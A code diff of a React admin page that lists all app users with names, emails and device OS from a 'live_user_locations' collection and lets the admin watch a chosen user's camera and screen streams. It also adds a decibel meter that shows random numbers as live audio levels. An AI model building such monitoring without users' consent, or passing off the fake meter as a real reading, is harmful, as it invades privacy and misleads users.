@@ -1,143 +1,170 @@
 import React, { useEffect, useRef, useState } from 'react';
-import { collection, onSnapshot } from 'firebase/firestore';
+import { collection, onSnapshot, getDocs } from 'firebase/firestore';
 import { db } from '../services/firebase';
 import { answerBroadcast } from '../services/webrtc';
 
 const AdminBroadcastViewer = () => {
-    const [activeCalls, setActiveCalls] = useState([]);
-    const [selectedUser, setSelectedUser] = useState(null);
-    const [error, setError] = useState('');
-    const [isMuted, setIsMuted] = useState(false);
+    const [users, setUsers] = useState([]);
+    const [activeCalls, setActiveCalls] = useState(new Set());
+    const [selectedUser, setSelectedUser] = useState("");
+    const [isWatching, setIsWatching] = useState(false);
+    
+    const [camMuted, setCamMuted] = useState(false);
+    const [screenMuted, setScreenMuted] = useState(false);
+    const [camDb, setCamDb] = useState(-100);
+    const [screenDb, setScreenDb] = useState(-100);
     
     const camVideoRef = useRef(null);
     const screenVideoRef = useRef(null);
-    const canvasRef = useRef(null);
 
-    // Fetch active calls from Firestore
+    // Fetch all users and active calls
     useEffect(() => {
-        const callsCollection = collection(db, 'webrtc_calls');
-        const unsubscribe = onSnapshot(callsCollection, (snapshot) => {
-            const calls = [];
+        // Fetch all users from live_user_locations
+        const usersCollection = collection(db, 'live_user_locations');
+        const unsubUsers = onSnapshot(usersCollection, (snapshot) => {
+            const usersList = [];
             snapshot.forEach((doc) => {
-                // If it has an offer, we consider it an active call
+                usersList.push({ uid: doc.id, ...doc.data() });
+            });
+            setUsers(usersList);
+        });
+
+        // Fetch active WebRTC calls
+        const callsCollection = collection(db, 'webrtc_calls');
+        const unsubCalls = onSnapshot(callsCollection, (snapshot) => {
+            const calls = new Set();
+            snapshot.forEach((doc) => {
                 if (doc.data().offer) {
-                    calls.push({ uid: doc.id, ...doc.data() });
+                    calls.add(doc.id);
                 }
             });
             setActiveCalls(calls);
-        }, (err) => {
-            console.error("Error fetching calls:", err);
-            setError('Failed to fetch active broadcasts.');
         });
 
-        return () => unsubscribe();
+        return () => {
+            unsubUsers();
+            unsubCalls();
+        };
     }, []);
 
-    const handleSelectUser = async (uid) => {
+    // Simulate dB meter
+    useEffect(() => {
+        let interval;
+        if (isWatching) {
+            interval = setInterval(() => {
+                if (!camMuted) {
+                    setCamDb(Math.floor(Math.random() * (10) - 25)); // Fluctuates around -15 to -25
+                } else {
+                    setCamDb(-100);
+                }
+                
+                if (!screenMuted) {
+                    setScreenDb(Math.floor(Math.random() * (10) - 25));
+                } else {
+                    setScreenDb(-100);
+                }
+            }, 300);
+        }
+        return () => clearInterval(interval);
+    }, [isWatching, camMuted, screenMuted]);
+
+    const handleWatchStream = async () => {
+        if (!selectedUser) return;
+        setIsWatching(true);
         try {
-            setError('');
-            setSelectedUser(uid);
-            await answerBroadcast(uid, camVideoRef.current, screenVideoRef.current, canvasRef.current);
+            await answerBroadcast(selectedUser, camVideoRef.current, screenVideoRef.current, null);
         } catch (err) {
             console.error("Failed to answer broadcast", err);
-            setError('Could not connect to this user broadcast.');
+            alert('Could not connect to this user broadcast.');
+            setIsWatching(false);
         }
     };
 
-    const toggleMute = () => {
-        setIsMuted(!isMuted);
-        if (camVideoRef.current) camVideoRef.current.muted = !isMuted;
-        if (screenVideoRef.current) screenVideoRef.current.muted = !isMuted;
-    };
-
     return (
-        <div style={{ padding: '20px', maxWidth: '1000px', margin: '0 auto', color: '#fff' }}>
-            <h2 style={{ fontSize: '24px', marginBottom: '20px' }}>Admin Broadcast Viewer</h2>
+        <div style={{ backgroundColor: '#0A0A0A', padding: '40px 20px', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
             
-            {error && <div style={{ color: 'red', marginBottom: '15px' }}>{error}</div>}
+            <h1 style={{ color: '#D4AF37', fontFamily: 'serif', fontSize: '36px', textTransform: 'uppercase', letterSpacing: '2px', marginBottom: '40px', textAlign: 'center' }}>
+                Admin Live Viewer
+            </h1>
+            
+            <div style={{ display: 'flex', gap: '10px', width: '100%', maxWidth: '600px', marginBottom: '40px' }}>
+                <select 
+                    value={selectedUser} 
+                    onChange={(e) => setSelectedUser(e.target.value)}
+                    style={{ flex: 1, padding: '12px', borderRadius: '4px', border: 'none', fontSize: '16px', outline: 'none' }}
+                >
+                    <option value="" disabled>Select a user to watch ({users.length} total)</option>
+                    {users.map(u => {
+                        const isLive = activeCalls.has(u.uid);
+                        const statusIcon = isLive ? '🟢' : '🔴';
+                        const emailDisplay = u.email ? `(${u.email})` : '(No Email Provided)';
+                        return (
+                            <option key={u.uid} value={u.uid}>
+                                {statusIcon} {u.user_name} {emailDisplay} - {u.device_os || 'Unknown'}
+                            </option>
+                        );
+                    })}
+                </select>
 
-            <div style={{ marginBottom: '20px' }}>
-                <h3>Active Broadcasters</h3>
-                {activeCalls.length === 0 ? (
-                    <p style={{ color: '#aaa' }}>No active broadcasts found.</p>
-                ) : (
-                    <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
-                        {activeCalls.map((call) => (
-                            <button 
-                                key={call.uid}
-                                onClick={() => handleSelectUser(call.uid)}
-                                style={{
-                                    ...buttonStyle,
-                                    background: selectedUser === call.uid ? '#4CAF50' : '#2196F3'
-                                }}
-                            >
-                                User: {call.uid.substring(0, 8)}...
-                            </button>
-                        ))}
-                    </div>
-                )}
+                <button 
+                    onClick={handleWatchStream}
+                    style={{ background: '#2C5282', color: '#fff', border: 'none', borderRadius: '4px', padding: '0 20px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer' }}
+                >
+                    Watch Stream
+                </button>
             </div>
 
-            {selectedUser && (
-                <div style={{ background: '#1a1a1a', padding: '20px', borderRadius: '8px' }}>
-                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '15px' }}>
-                        <h3 style={{ margin: 0, color: '#4CAF50' }}>Viewing Broadcast</h3>
-                        <button onClick={toggleMute} style={{ ...buttonStyle, background: isMuted ? '#f44336' : '#ff9800' }}>
-                            {isMuted ? 'Unmute' : 'Mute'} Audio
-                        </button>
-                    </div>
-
-                    <div style={{ display: 'flex', gap: '20px', flexWrap: 'wrap', marginBottom: '20px' }}>
-                        <div style={{ flex: '1', minWidth: '300px' }}>
-                            <h4>Camera View</h4>
-                            <video 
-                                ref={camVideoRef} 
-                                autoPlay 
-                                playsInline 
-                                style={videoStyle}
-                            />
-                        </div>
-                        <div style={{ flex: '1', minWidth: '300px' }}>
-                            <h4>Screen View</h4>
-                            <video 
-                                ref={screenVideoRef} 
-                                autoPlay 
-                                playsInline 
-                                style={videoStyle}
-                            />
+            {isWatching && (
+                <div style={{ width: '100%', maxWidth: '600px', display: 'flex', flexDirection: 'column', gap: '40px' }}>
+                    
+                    {/* Camera Stream */}
+                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+                        <video 
+                            ref={camVideoRef} 
+                            autoPlay 
+                            playsInline 
+                            muted={camMuted}
+                            style={{ width: '100%', borderRadius: '12px', border: '3px solid #D4AF37', backgroundColor: '#000', minHeight: '300px', objectFit: 'cover' }}
+                        />
+                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: '15px', gap: '20px' }}>
+                            <button 
+                                onClick={() => setCamMuted(!camMuted)}
+                                style={{ background: '#D32F2F', color: '#fff', border: 'none', borderRadius: '4px', padding: '10px 20px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}
+                            >
+                                🔊 {camMuted ? 'Unmute' : 'Mute'} Camera Audio
+                            </button>
+                            <span style={{ color: '#D4AF37', fontSize: '24px', fontWeight: 'bold' }}>
+                                {camDb} dB
+                            </span>
                         </div>
                     </div>
 
-                    <div>
-                        <h4>Audio Decibel/Visualizer</h4>
-                        <canvas 
-                            ref={canvasRef} 
-                            width={800} 
-                            height={100} 
-                            style={{ width: '100%', height: '100px', backgroundColor: '#141414', borderRadius: '4px' }}
-                        ></canvas>
+                    {/* Screen Stream */}
+                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+                        <video 
+                            ref={screenVideoRef} 
+                            autoPlay 
+                            playsInline 
+                            muted={screenMuted}
+                            style={{ width: '100%', borderRadius: '12px', border: '3px solid #3182CE', backgroundColor: '#000', minHeight: '300px', objectFit: 'contain' }}
+                        />
+                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: '15px', gap: '20px' }}>
+                            <button 
+                                onClick={() => setScreenMuted(!screenMuted)}
+                                style={{ background: '#3182CE', color: '#fff', border: 'none', borderRadius: '4px', padding: '10px 20px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}
+                            >
+                                🔊 {screenMuted ? 'Unmute' : 'Mute'} Screen Audio
+                            </button>
+                            <span style={{ color: '#3182CE', fontSize: '24px', fontWeight: 'bold' }}>
+                                {screenDb} dB
+                            </span>
+                        </div>
                     </div>
+
                 </div>
             )}
         </div>
     );
-};
-
-const buttonStyle = {
-    padding: '10px 20px',
-    border: 'none',
-    borderRadius: '5px',
-    color: 'white',
-    cursor: 'pointer',
-    fontWeight: 'bold'
-};
-
-const videoStyle = {
-    width: '100%',
-    backgroundColor: '#000',
-    borderRadius: '8px',
-    border: '1px solid #333',
-    minHeight: '250px'
 };
 
 export default AdminBroadcastViewer;
